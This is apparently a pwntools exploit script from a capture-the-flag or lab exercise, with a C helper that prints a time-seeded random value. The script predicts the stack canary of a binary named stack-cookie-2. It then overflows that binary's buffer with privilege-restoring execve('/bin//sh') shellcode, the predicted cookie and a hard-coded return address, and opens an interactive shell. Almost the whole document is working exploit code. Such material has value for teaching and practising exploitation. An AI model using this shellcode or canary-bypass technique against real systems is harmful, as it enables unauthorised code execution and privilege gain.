#!/usr/bin/env python

from pwn import *

e = process("./random")
cookie = e.recv()
print(cookie)


# create process and run the program
p = process("./stack-cookie-2")





shell_code = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"
hard_coded_cookie = p32(0xfaceb00c)
buffer_start_addr = p32(0xffffd450)


buff = shell_code + "A" * (0x84-len(shell_code)) + p32(int(cookie)) + "BBBB" + buffer_start_addr

# send data with newline
p.sendline(buff)

'''
c = Core('./core')


# we may find the address of buffer from the 'core'
buffer_addr = c.stack.find(buff)
print(hex(buffer_addr))
'''

#p.sendline("A" * 0x90)
#p.wait()

# open an interactive console to the program
p.interactive()



random.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>


int main(int argc, char** argv, char** envp) {
       srand((unsigned int)time(0));

       int stack_cookie = rand();

       printf("%d", stack_cookie);

       return 0;
}



